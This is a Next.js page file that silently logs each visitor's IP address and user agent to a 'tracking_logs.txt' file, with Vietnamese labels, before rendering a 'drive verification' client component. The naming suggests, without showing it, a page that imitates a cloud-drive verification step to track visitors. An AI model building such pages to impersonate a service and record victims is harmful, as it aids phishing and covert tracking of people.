
import { headers } from 'next/headers';
import fs from 'fs';
import path from 'path';
import { DriveVerificationClient } from '@/components/drive-verification-client';
import { getVerificationConfigAction } from '@/app/actions/settings';

async function logInitialAccess() {
  const headersList = headers();

  const getClientIp = () => {
    // Headers are checked in order of preference.
    const headersToCheck = [
      'x-vercel-forwarded-for', // Vercel
      'x-real-ip',              // Nginx
      'x-forwarded-for',        // Standard proxy
      'cf-connecting-ip',       // Cloudflare
      'true-client-ip',         // Cloudflare
    ];

    for (const header of headersToCheck) {
        const value = headersList.get(header);
        if (value) {
            // The x-forwarded-for header can contain a comma-separated list of IPs.
            // The first one is the original client IP.
            return value.split(',')[0].trim();
        }
    }
    
    // Fallback for local development or environments without these headers.
    return '127.0.0.1';
  };

  const ip = getClientIp();
  const ua = headersList.get('user-agent') ?? 'unknown';
  const logDir = path.join(process.cwd(), 'logs');
  const logFile = path.join(logDir, 'tracking_logs.txt');

  const logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\nIP: ${ip}\nThiết bị: ${ua}\n`;

  try {
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(logFile, logData, 'utf-8');
  } catch (error) {
    console.error('Failed to write initial access log:', error);
  }
}

export default async function VerificationPage() {
  await logInitialAccess();
  const config = await getVerificationConfigAction();
  return <DriveVerificationClient config={config} />;
}
